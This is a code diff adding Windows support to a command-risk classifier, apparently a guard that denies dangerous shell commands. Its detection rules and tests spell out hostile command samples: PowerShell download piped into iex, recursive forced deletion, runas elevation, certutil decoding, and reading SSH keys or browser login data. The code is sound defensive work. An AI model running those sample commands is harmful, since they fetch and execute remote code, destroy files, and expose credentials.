@@ -71,8 +71,18 @@ pub fn classifyArgv(argv: []const []const u8) Classification {
     if (isPrivilegeEscalation(lower_exe)) {
         return deny(.privilege_escalation, 98, "privilege escalation command", exe);
     }
-    if (isPowerShell(lower_exe) and hasPowerShellEncodedCommand(argv[1..])) {
-        return deny(.obfuscated, 98, "PowerShell encoded command", exe);
+    if (isPowerShell(lower_exe)) {
+        if (hasPowerShellEncodedCommand(argv[1..])) {
+            return deny(.obfuscated, 98, "PowerShell encoded command", exe);
+        }
+        if (powerShellCommandArgs(argv[1..])) |script_args| {
+            return classifyPowerShellCommandArgs(exe, script_args);
+        }
+    }
+    if (isCmd(lower_exe)) {
+        if (cmdCommandArgs(argv[1..])) |script_args| {
+            return classifyCmdCommandArgs(exe, script_args);
+        }
     }
     if (isShell(lower_exe)) {
         if (shellScriptArg(argv[1..])) |script| {
@@ -94,6 +104,15 @@ pub fn classifyArgv(argv: []const []const u8) Classification {
     if (std.ascii.eqlIgnoreCase(lower_exe, "git") and argv.len >= 2 and std.ascii.eqlIgnoreCase(argv[1], "push")) {
         if (hasForceFlag(argv[2..])) return deny(.git_remote_write, 95, "force push can rewrite remote history", exe);
         return .{ .risk_class = .git_remote_write, .risk_score = 80, .default_decision = .ask, .reason = "git remote write", .executable = exe };
+    }
+    if (std.ascii.eqlIgnoreCase(lower_exe, "reg") and argv.len >= 2 and (std.ascii.eqlIgnoreCase(argv[1], "add") or std.ascii.eqlIgnoreCase(argv[1], "delete"))) {
+        return deny(.privilege_escalation, 95, "Windows registry mutation", exe);
+    }
+    if (std.ascii.eqlIgnoreCase(lower_exe, "certutil") and hasCertutilDecode(argv[1..])) {
+        return deny(.obfuscated, 94, "certutil decode can stage obfuscated payloads", exe);
+    }
+    if (std.ascii.eqlIgnoreCase(lower_exe, "type") and readsProtectedCredential(argv[1..])) {
+        return deny(.credential_inspection, 96, "credential file inspection", exe);
     }
     if (std.ascii.eqlIgnoreCase(lower_exe, "cat") and readsProtectedCredential(argv[1..])) {
         return deny(.credential_inspection, 96, "credential file inspection", exe);
@@ -185,7 +204,11 @@ pub fn createShimDirectory(
     errdefer allocator.free(shim_dir);
     try std.fs.cwd().makePath(shim_dir);
     inline for (shim_names) |name| {
-        try writePosixShim(allocator, shim_dir, name, aegis_executable);
+        if (builtin.os.tag == .windows) {
+            try writeWindowsExecutableShim(allocator, shim_dir, name, aegis_executable);
+        } else {
+            try writePosixShim(allocator, shim_dir, name, aegis_executable);
+        }
     }
     return shim_dir;
 }
@@ -207,7 +230,7 @@ pub fn pathWithoutShimAlloc(allocator: std.mem.Allocator, path_value: []const u8
     var parts = std.mem.splitScalar(u8, path_value, pathDelimiter());
     var first = true;
     while (parts.next()) |part| {
-        if (part.len == 0 or std.mem.eql(u8, part, shim_dir)) continue;
+        if (part.len == 0 or pathPartEquals(part, shim_dir)) continue;
         if (!first) try list.append(allocator, pathDelimiter());
         try list.appendSlice(allocator, part);
         first = false;
@@ -221,17 +244,14 @@ pub fn resolveRealBinaryAlloc(
     path_value: []const u8,
     shim_dir: []const u8,
 ) ![]u8 {
-    if (std.fs.path.isAbsolute(command_name) or std.mem.indexOfScalar(u8, command_name, '/') != null) {
+    if (isAbsoluteOrExplicitPath(command_name)) {
         if (isExecutable(command_name) and !isWithinDir(command_name, shim_dir)) return allocator.dupe(u8, command_name);
         return error.CommandNotFound;
     }
     var parts = std.mem.splitScalar(u8, path_value, pathDelimiter());
     while (parts.next()) |part| {
-        if (part.len == 0 or std.mem.eql(u8, part, shim_dir)) continue;
-        const candidate = try std.fs.path.join(allocator, &.{ part, command_name });
-        errdefer allocator.free(candidate);
-        if (isExecutable(candidate) and !isWithinDir(candidate, shim_dir)) return candidate;
-        allocator.free(candidate);
+        if (part.len == 0 or pathPartEquals(part, shim_dir)) continue;
+        if (try resolveCandidateInDir(allocator, part, command_name, shim_dir)) |candidate| return candidate;
     }
     return error.CommandNotFound;
 }
@@ -319,15 +339,74 @@ fn writePosixShim(allocator: std.mem.Allocator, shim_dir: []const u8, name: []co
     if (builtin.os.tag != .windows) try file.chmod(0o755);
 }
 
+fn writeWindowsExecutableShim(allocator: std.mem.Allocator, shim_dir: []const u8, name: []const u8, aegis_executable: []const u8) !void {
+    const filename = try std.fmt.allocPrint(allocator, "{s}.exe", .{name});
+    defer allocator.free(filename);
+    const path = try std.fs.path.join(allocator, &.{ shim_dir, filename });
+    defer allocator.free(path);
+    try std.fs.copyFileAbsolute(aegis_executable, path, .{});
+}
+
+pub fn shimAliasFromExecutablePath(executable_path: []const u8) ?[]const u8 {
+    const exe = basename(executable_path);
+    inline for (shim_names) |name| {
+        if (std.ascii.eqlIgnoreCase(exe, name)) return name;
+        if (endsWithAsciiIgnoreCase(exe, ".exe") and exe.len == name.len + 4 and std.ascii.eqlIgnoreCase(exe[0..name.len], name)) return name;
+    }
+    return null;
+}
+
 fn isExecutable(path: []const u8) bool {
     const file = std.fs.cwd().openFile(path, .{}) catch return false;
     defer file.close();
     const stat = file.stat() catch return false;
+    if (builtin.os.tag == .windows) return stat.kind == .file;
     return stat.kind == .file and (stat.mode & 0o111) != 0;
 }
 
 fn isWithinDir(path: []const u8, dir: []const u8) bool {
+    if (builtin.os.tag == .windows) {
+        return startsWithAsciiIgnoreCase(path, dir) and (path.len == dir.len or path[dir.len] == '/' or path[dir.len] == '\\');
+    }
     return std.mem.startsWith(u8, path, dir) and (path.len == dir.len or path[dir.len] == std.fs.path.sep);
+}
+
+fn pathPartEquals(left: []const u8, right: []const u8) bool {
+    if (builtin.os.tag == .windows) return std.ascii.eqlIgnoreCase(left, right);
+    return std.mem.eql(u8, left, right);
+}
+
+fn isAbsoluteOrExplicitPath(command_name: []const u8) bool {
+    if (std.fs.path.isAbsolute(command_name)) return true;
+    return std.mem.indexOfScalar(u8, command_name, '/') != null or
+        std.mem.indexOfScalar(u8, command_name, '\\') != null or
+        (command_name.len >= 2 and std.ascii.isAlphabetic(command_name[0]) and command_name[1] == ':');
+}
+
+fn resolveCandidateInDir(allocator: std.mem.Allocator, dir: []const u8, command_name: []const u8, shim_dir: []const u8) !?[]u8 {
+    const direct = try std.fs.path.join(allocator, &.{ dir, command_name });
+    errdefer allocator.free(direct);
+    if (isExecutable(direct) and !isWithinDir(direct, shim_dir)) return direct;
+    allocator.free(direct);
+
+    if (builtin.os.tag != .windows or hasKnownWindowsExtension(command_name)) return null;
+    const extensions = [_][]const u8{ ".exe", ".cmd", ".bat", ".com" };
+    for (extensions) |extension| {
+        const candidate_name = try std.fmt.allocPrint(allocator, "{s}{s}", .{ command_name, extension });
+        defer allocator.free(candidate_name);
+        const candidate = try std.fs.path.join(allocator, &.{ dir, candidate_name });
+        errdefer allocator.free(candidate);
+        if (isExecutable(candidate) and !isWithinDir(candidate, shim_dir)) return candidate;
+        allocator.free(candidate);
+    }
+    return null;
+}
+
+fn hasKnownWindowsExtension(command_name: []const u8) bool {
+    return endsWithAsciiIgnoreCase(command_name, ".exe") or
+        endsWithAsciiIgnoreCase(command_name, ".cmd") or
+        endsWithAsciiIgnoreCase(command_name, ".bat") or
+        endsWithAsciiIgnoreCase(command_name, ".com");
 }
 
 fn pathDelimiter() u8 {
@@ -397,6 +476,93 @@ fn classifyShellScript(exe: []const u8, script: []const u8) Classification {
     return .{ .risk_class = .unknown, .risk_score = 60, .default_decision = .ask, .reason = "shell command string", .executable = exe };
 }
 
+fn classifyPowerShellScript(exe: []const u8, script: []const u8) Classification {
+    if (scriptHasInvokeWebRequestIex(script)) return deny(.network_script, 97, "PowerShell Invoke-WebRequest piped into iex", exe);
+    if (containsAsciiIgnoreCase(script, "remove-item") and containsAsciiIgnoreCase(script, "-recurse") and containsAsciiIgnoreCase(script, "-force")) {
+        return deny(.destructive_filesystem, 97, "PowerShell recursive force removal", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "start-process") and containsAsciiIgnoreCase(script, "-verb") and containsAsciiIgnoreCase(script, "runas")) {
+        return deny(.privilege_escalation, 98, "PowerShell elevation through Start-Process -Verb RunAs", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "certutil") and containsAsciiIgnoreCase(script, "decode")) {
+        return deny(.obfuscated, 94, "certutil decode can stage obfuscated payloads", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "type ") and commandTextReadsProtectedCredential(script)) {
+        return deny(.credential_inspection, 96, "credential file inspection", exe);
+    }
+    return .{ .risk_class = .unknown, .risk_score = 60, .default_decision = .ask, .reason = "PowerShell command string", .executable = exe };
+}
+
+fn classifyPowerShellCommandArgs(exe: []const u8, args: []const []const u8) Classification {
+    if (args.len == 0) return classifyPowerShellScript(exe, "");
+    if (args.len == 1) return classifyPowerShellScript(exe, args[0]);
+    if (argsHaveInvokeDownload(args) and argsHavePipeToIex(args)) return deny(.network_script, 97, "PowerShell Invoke-WebRequest piped into iex", exe);
+    if (argsContain(args, "remove-item") and argsContain(args, "-recurse") and argsContain(args, "-force")) {
+        return deny(.destructive_filesystem, 97, "PowerShell recursive force removal", exe);
+    }
+    if (argsContain(args, "start-process") and argsContain(args, "-verb") and argsContain(args, "runas")) {
+        return deny(.privilege_escalation, 98, "PowerShell elevation through Start-Process -Verb RunAs", exe);
+    }
+    if (argsContain(args, "certutil") and argsContainDecode(args)) {
+        return deny(.obfuscated, 94, "certutil decode can stage obfuscated payloads", exe);
+    }
+    if (argsContain(args, "type") and commandArgsReadProtectedCredential(args)) {
+        return deny(.credential_inspection, 96, "credential file inspection", exe);
+    }
+    return .{ .risk_class = .unknown, .risk_score = 60, .default_decision = .ask, .reason = "PowerShell command argv", .executable = exe };
+}
+
+fn classifyCmdScript(exe: []const u8, script: []const u8) Classification {
+    if (containsAsciiIgnoreCase(script, "powershell") and (containsAsciiIgnoreCase(script, "-encodedcommand") or containsAsciiIgnoreCase(script, " -enc"))) {
+        return deny(.obfuscated, 98, "cmd launches PowerShell encoded command", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "pwsh") and (containsAsciiIgnoreCase(script, "-encodedcommand") or containsAsciiIgnoreCase(script, " -enc"))) {
+        return deny(.obfuscated, 98, "cmd launches PowerShell encoded command", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "rmdir") and containsAsciiIgnoreCase(script, "/s") and containsAsciiIgnoreCase(script, "/q")) {
+        return deny(.destructive_filesystem, 96, "cmd recursive quiet directory removal", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "del") and containsAsciiIgnoreCase(script, "/s") and containsAsciiIgnoreCase(script, "/q")) {
+        return deny(.destructive_filesystem, 94, "cmd recursive quiet file deletion", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "runas")) return deny(.privilege_escalation, 98, "Windows runas elevation", exe);
+    if (containsAsciiIgnoreCase(script, "reg add") or containsAsciiIgnoreCase(script, "reg delete")) {
+        return deny(.privilege_escalation, 95, "Windows registry mutation", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "certutil") and containsAsciiIgnoreCase(script, "decode")) {
+        return deny(.obfuscated, 94, "certutil decode can stage obfuscated payloads", exe);
+    }
+    if (containsAsciiIgnoreCase(script, "type ") and commandTextReadsProtectedCredential(script)) {
+        return deny(.credential_inspection, 96, "credential file inspection", exe);
+    }
+    return .{ .risk_class = .unknown, .risk_score = 60, .default_decision = .ask, .reason = "cmd command string", .executable = exe };
+}
+
+fn classifyCmdCommandArgs(exe: []const u8, args: []const []const u8) Classification {
+    if (args.len == 0) return classifyCmdScript(exe, "");
+    if (args.len == 1) return classifyCmdScript(exe, args[0]);
+    if ((argsContain(args, "powershell") or argsContain(args, "powershell.exe") or argsContain(args, "pwsh") or argsContain(args, "pwsh.exe")) and argsContainPowerShellEncodedFlag(args)) {
+        return deny(.obfuscated, 98, "cmd launches PowerShell encoded command", exe);
+    }
+    if (argsContain(args, "rmdir") and argsContain(args, "/s") and argsContain(args, "/q")) {
+        return deny(.destructive_filesystem, 96, "cmd recursive quiet directory removal", exe);
+    }
+    if (argsContain(args, "del") and argsContain(args, "/s") and argsContain(args, "/q")) {
+        return deny(.destructive_filesystem, 94, "cmd recursive quiet file deletion", exe);
+    }
+    if (argsContain(args, "runas") or argsContain(args, "runas.exe")) return deny(.privilege_escalation, 98, "Windows runas elevation", exe);
+    if (argsContain(args, "reg") and (argsContain(args, "add") or argsContain(args, "delete"))) {
+        return deny(.privilege_escalation, 95, "Windows registry mutation", exe);
+    }
+    if (argsContain(args, "certutil") and argsContainDecode(args)) {
+        return deny(.obfuscated, 94, "certutil decode can stage obfuscated payloads", exe);
+    }
+    if (argsContain(args, "type") and commandArgsReadProtectedCredential(args)) {
+        return deny(.credential_inspection, 96, "credential file inspection", exe);
+    }
+    return .{ .risk_class = .unknown, .risk_score = 60, .default_decision = .ask, .reason = "cmd command argv", .executable = exe };
+}
+
 fn deny(risk_class: RiskClass, score: u8, reason: []const u8, exe: []const u8) Classification {
     return .{
         .risk_class = risk_class,
@@ -437,11 +603,15 @@ fn isPlainDisplayArg(arg: []const u8) bool {
 }
 
 fn basename(path: []const u8) []const u8 {
-    return std.fs.path.basename(path);
+    var end = path.len;
+    while (end > 0 and (path[end - 1] == '/' or path[end - 1] == '\\')) end -= 1;
+    var start = end;
+    while (start > 0 and path[start - 1] != '/' and path[start - 1] != '\\') start -= 1;
+    return path[start..end];
 }
 
 fn isPrivilegeEscalation(exe: []const u8) bool {
-    return std.ascii.eqlIgnoreCase(exe, "sudo") or std.ascii.eqlIgnoreCase(exe, "su") or std.ascii.eqlIgnoreCase(exe, "doas");
+    return std.ascii.eqlIgnoreCase(exe, "sudo") or std.ascii.eqlIgnoreCase(exe, "su") or std.ascii.eqlIgnoreCase(exe, "doas") or std.ascii.eqlIgnoreCase(exe, "runas") or std.ascii.eqlIgnoreCase(exe, "runas.exe");
 }
 
 fn isPowerShell(exe: []const u8) bool {
@@ -450,6 +620,10 @@ fn isPowerShell(exe: []const u8) bool {
 
 fn isShell(exe: []const u8) bool {
     return std.ascii.eqlIgnoreCase(exe, "sh") or std.ascii.eqlIgnoreCase(exe, "bash") or std.ascii.eqlIgnoreCase(exe, "zsh") or std.ascii.eqlIgnoreCase(exe, "fish");
+}
+
+fn isCmd(exe: []const u8) bool {
+    return std.ascii.eqlIgnoreCase(exe, "cmd") or std.ascii.eqlIgnoreCase(exe, "cmd.exe");
 }
 
 fn isRemoteShell(exe: []const u8) bool {
@@ -470,6 +644,26 @@ fn shellScriptArg(args: []const []const u8) ?[]const u8 {
         if (std.mem.eql(u8, args[index], "-c")) {
             if (index + 1 < args.len) return args[index + 1];
             return "";
+        }
+    }
+    return null;
+}
+
+fn powerShellCommandArgs(args: []const []const u8) ?[]const []const u8 {
+    var index: usize = 0;
+    while (index < args.len) : (index += 1) {
+        if (std.ascii.eqlIgnoreCase(args[index], "-Command") or std.ascii.eqlIgnoreCase(args[index], "-c")) {
+            return args[index + 1 ..];
+        }
+    }
+    return null;
+}
+
+fn cmdCommandArgs(args: []const []const u8) ?[]const []const u8 {
+    var index: usize = 0;
+    while (index < args.len) : (index += 1) {
+        if (std.ascii.eqlIgnoreCase(args[index], "/c") or std.ascii.eqlIgnoreCase(args[index], "/k")) {
+            return args[index + 1 ..];
         }
     }
     return null;
@@ -504,10 +698,77 @@ fn readsProtectedCredential(args: []const []const u8) bool {
         if (std.mem.eql(u8, arg, ".env") or startsWithAsciiIgnoreCase(arg, ".env.")) return true;
         if (startsWithAsciiIgnoreCase(arg, "./.env")) return true;
         if (startsWithAsciiIgnoreCase(arg, "~/.ssh/") or startsWithAsciiIgnoreCase(arg, "~/.aws/") or startsWithAsciiIgnoreCase(arg, "~/.gcloud/") or startsWithAsciiIgnoreCase(arg, "~/.azure/")) return true;
-        if (containsAsciiIgnoreCase(arg, "/.ssh/") or containsAsciiIgnoreCase(arg, "/.aws/") or containsAsciiIgnoreCase(arg, "/.config/gh/")) return true;
+        if (containsAsciiIgnoreCase(arg, "/.ssh/") or containsAsciiIgnoreCase(arg, "\\.ssh\\") or containsAsciiIgnoreCase(arg, "/.aws/") or containsAsciiIgnoreCase(arg, "\\.aws\\") or containsAsciiIgnoreCase(arg, "/.config/gh/")) return true;
+        if (containsAsciiIgnoreCase(arg, "%userprofile%\\.ssh\\") or containsAsciiIgnoreCase(arg, "%appdata%\\github cli\\") or containsAsciiIgnoreCase(arg, "%appdata%\\gh\\")) return true;
+        if (containsAsciiIgnoreCase(arg, "login data") or containsAsciiIgnoreCase(arg, "cookies.sqlite")) return true;
         if (containsAsciiIgnoreCase(arg, "id_rsa") or containsAsciiIgnoreCase(arg, "id_ed25519")) return true;
     }
     return false;
+}
+
+fn commandTextReadsProtectedCredential(script: []const u8) bool {
+    return containsAsciiIgnoreCase(script, ".env") or
+        containsAsciiIgnoreCase(script, "%userprofile%\\.ssh\\") or
+        containsAsciiIgnoreCase(script, "\\.ssh\\") or
+        containsAsciiIgnoreCase(script, "/.ssh/") or
+        containsAsciiIgnoreCase(script, "id_ed25519") or
+        containsAsciiIgnoreCase(script, "id_rsa") or
+        containsAsciiIgnoreCase(script, "login data") or
+        containsAsciiIgnoreCase(script, "credentials") or
+        containsAsciiIgnoreCase(script, "token");
+}
+
+fn commandArgsReadProtectedCredential(args: []const []const u8) bool {
+    return readsProtectedCredential(args) or blk: {
+        for (args) |arg| {
+            if (containsAsciiIgnoreCase(arg, "credentials") or containsAsciiIgnoreCase(arg, "token") or containsAsciiIgnoreCase(arg, "login data")) break :blk true;
+        }
+        break :blk false;
+    };
+}
+
+fn argsContain(args: []const []const u8, needle: []const u8) bool {
+    for (args) |arg| {
+        if (std.ascii.eqlIgnoreCase(arg, needle) or containsAsciiIgnoreCase(arg, needle)) return true;
+    }
+    return false;
+}
+
+fn argsHaveInvokeDownload(args: []const []const u8) bool {
+    return argsContain(args, "invoke-webrequest") or argsContain(args, "invoke-restmethod") or argsContain(args, "iwr") or argsContain(args, "irm");
+}
+
+fn argsHavePipeToIex(args: []const []const u8) bool {
+    var saw_pipe = false;
+    var saw_iex = false;
+    for (args) |arg| {
+        if (std.mem.eql(u8, arg, "|") or containsAsciiIgnoreCase(arg, "|")) saw_pipe = true;
+        if (std.ascii.eqlIgnoreCase(arg, "iex") or containsAsciiIgnoreCase(arg, "iex")) saw_iex = true;
+    }
+    return saw_pipe and saw_iex;
+}
+
+fn argsContainDecode(args: []const []const u8) bool {
+    for (args) |arg| {
+        if (std.ascii.eqlIgnoreCase(arg, "-decode") or std.ascii.eqlIgnoreCase(arg, "-decodehex") or containsAsciiIgnoreCase(arg, "decode")) return true;
+    }
+    return false;
+}
+
+fn argsContainPowerShellEncodedFlag(args: []const []const u8) bool {
+    for (args) |arg| {
+        if (std.ascii.eqlIgnoreCase(arg, "-EncodedCommand") or std.ascii.eqlIgnoreCase(arg, "-enc")) return true;
+        if (startsWithAsciiIgnoreCase(arg, "-EncodedCommand:") or startsWithAsciiIgnoreCase(arg, "-enc:")) return true;
+    }
+    return false;
+}
+
+fn hasCertutilDecode(args: []const []const u8) bool {
+    var saw_decode = false;
+    for (args) |arg| {
+        if (std.ascii.eqlIgnoreCase(arg, "-decode") or std.ascii.eqlIgnoreCase(arg, "-decodehex")) saw_decode = true;
+    }
+    return saw_decode;
 }
 
 fn isPackageInstall(argv: []const []const u8) bool {
@@ -557,7 +818,11 @@ fn scriptHasNetworkPipeToShell(script: []const u8) bool {
 
 fn scriptHasInvokeWebRequestIex(script: []const u8) bool {
     if (std.mem.indexOfScalar(u8, script, '|') == null) return false;
-    return containsAsciiIgnoreCase(script, "invoke-webrequest") and (containsAsciiIgnoreCase(script, "| iex") or containsAsciiIgnoreCase(script, "|iex"));
+    const downloads = containsAsciiIgnoreCase(script, "invoke-webrequest") or
+        containsAsciiIgnoreCase(script, "invoke-restmethod") or
+        containsAsciiIgnoreCase(script, "iwr ") or
+        containsAsciiIgnoreCase(script, "irm ");
+    return downloads and (containsAsciiIgnoreCase(script, "| iex") or containsAsciiIgnoreCase(script, "|iex"));
 }
 
 fn scriptHasBase64PipeShell(script: []const u8) bool {
@@ -573,6 +838,10 @@ fn containsAsciiIgnoreCase(haystack: []const u8, needle: []const u8) bool {
 
 fn startsWithAsciiIgnoreCase(value: []const u8, prefix: []const u8) bool {
     return value.len >= prefix.len and std.ascii.eqlIgnoreCase(value[0..prefix.len], prefix);
+}
+
+fn endsWithAsciiIgnoreCase(value: []const u8, suffix: []const u8) bool {
+    return value.len >= suffix.len and std.ascii.eqlIgnoreCase(value[value.len - suffix.len ..], suffix);
 }
 
 const TokenList = struct {
@@ -635,6 +904,30 @@ test "command classifier catches required high risk patterns" {
     try std.testing.expectEqual(RiskClass.credential_inspection, classifyArgv(&.{ "cat", ".env" }).risk_class);
     try std.testing.expectEqual(RiskClass.credential_inspection, classifyArgv(&.{ "cat", "~/.ssh/id_ed25519" }).risk_class);
     try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "powershell", "-EncodedCommand", "abcd" }).risk_class);
+}
+
+test "command classifier catches Windows risky patterns" {
+    try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "powershell.exe", "-EncodedCommand", "abcd" }).risk_class);
+    try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "pwsh.exe", "-enc:abcd" }).risk_class);
+    try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "cmd.exe", "/c", "powershell -enc abcd" }).risk_class);
+    try std.testing.expectEqual(RiskClass.network_script, classifyArgv(&.{ "powershell", "-NoProfile", "-Command", "Invoke-WebRequest https://example.invalid/install.ps1 | iex" }).risk_class);
+    try std.testing.expectEqual(RiskClass.network_script, classifyArgv(&.{ "pwsh", "-Command", "irm https://example.invalid/install.ps1 | iex" }).risk_class);
+    try std.testing.expectEqual(RiskClass.destructive_filesystem, classifyArgv(&.{ "powershell", "-Command", "Remove-Item -Recurse -Force C:\\temp\\x" }).risk_class);
+    try std.testing.expectEqual(RiskClass.destructive_filesystem, classifyArgv(&.{ "cmd", "/c", "rmdir /s /q C:\\temp\\x" }).risk_class);
+    try std.testing.expectEqual(RiskClass.privilege_escalation, classifyArgv(&.{ "powershell", "-Command", "Start-Process cmd -Verb RunAs" }).risk_class);
+    try std.testing.expectEqual(RiskClass.privilege_escalation, classifyArgv(&.{ "runas", "/user:Administrator", "cmd" }).risk_class);
+    try std.testing.expectEqual(RiskClass.privilege_escalation, classifyArgv(&.{ "reg", "add", "HKCU\\Software\\Aegis" }).risk_class);
+    try std.testing.expectEqual(RiskClass.credential_inspection, classifyArgv(&.{ "type", "%USERPROFILE%\\.ssh\\id_ed25519" }).risk_class);
+    try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "certutil", "-decode", "in.txt", "out.exe" }).risk_class);
+}
+
+test "command classifier catches split Windows shell command args" {
+    try std.testing.expectEqual(RiskClass.destructive_filesystem, classifyArgv(&.{ "cmd.exe", "/c", "rmdir", "/s", "/q", "C:\\temp\\x" }).risk_class);
+    try std.testing.expectEqual(RiskClass.destructive_filesystem, classifyArgv(&.{ "cmd.exe", "/c", "del", "/s", "/q", "C:\\temp\\x" }).risk_class);
+    try std.testing.expectEqual(RiskClass.obfuscated, classifyArgv(&.{ "cmd.exe", "/c", "powershell.exe", "-EncodedCommand", "abcd" }).risk_class);
+    try std.testing.expectEqual(RiskClass.destructive_filesystem, classifyArgv(&.{ "powershell.exe", "-Command", "Remove-Item", "-Recurse", "-Force", "C:\\temp\\x" }).risk_class);
+    try std.testing.expectEqual(RiskClass.privilege_escalation, classifyArgv(&.{ "powershell.exe", "-Command", "Start-Process", "cmd", "-Verb", "RunAs" }).risk_class);
+    try std.testing.expectEqual(RiskClass.network_script, classifyArgv(&.{ "pwsh.exe", "-Command", "Invoke-WebRequest", "https://example.invalid/install.ps1", "|", "iex" }).risk_class);
 }
 
 test "shell command classifier catches network and obfuscation pipes" {
@@ -718,6 +1011,35 @@ test "shim directory includes sh bash and zsh wrappers" {
         try std.testing.expect(std.mem.indexOf(u8, script, "aegis\" shim exec --") != null or std.mem.indexOf(u8, script, "true\" shim exec --") != null);
         try std.testing.expect(std.mem.indexOf(u8, script, shell) != null);
     }
+}
+
+test "Windows shim directory includes executable cmd PowerShell and PATH shims" {
+    if (@import("builtin").os.tag != .windows) return error.SkipZigTest;
+
+    var tmp = std.testing.tmpDir(.{});
+    defer tmp.cleanup();
+    const root = try tmp.dir.realpathAlloc(std.testing.allocator, ".");
+    defer std.testing.allocator.free(root);
+
+    const self_exe = try std.fs.selfExePathAlloc(std.testing.allocator);
+    defer std.testing.allocator.free(self_exe);
+    const shim_dir = try createShimDirectory(std.testing.allocator, root, "windows-wrapper-test", self_exe);
+    defer std.testing.allocator.free(shim_dir);
+
+    const wrappers = [_][]const u8{ "cmd.exe", "powershell.exe", "pwsh.exe", "git.exe" };
+    for (wrappers) |wrapper| {
+        const shim_path = try std.fs.path.join(std.testing.allocator, &.{ shim_dir, wrapper });
+        defer std.testing.allocator.free(shim_path);
+        try std.fs.cwd().access(shim_path, .{});
+    }
+}
+
+test "Windows executable shim aliases route extension-qualified invocations" {
+    try std.testing.expectEqualStrings("cmd", shimAliasFromExecutablePath("C:\\repo\\.aegis\\sessions\\id\\shims\\cmd.exe").?);
+    try std.testing.expectEqualStrings("powershell", shimAliasFromExecutablePath("powershell.exe").?);
+    try std.testing.expectEqualStrings("pwsh", shimAliasFromExecutablePath("pwsh.exe").?);
+    try std.testing.expectEqualStrings("git", shimAliasFromExecutablePath("git.exe").?);
+    try std.testing.expect(shimAliasFromExecutablePath("aegis.exe") == null);
 }
 
 test "approval hashes are bounded and consumable without raw command persistence" {
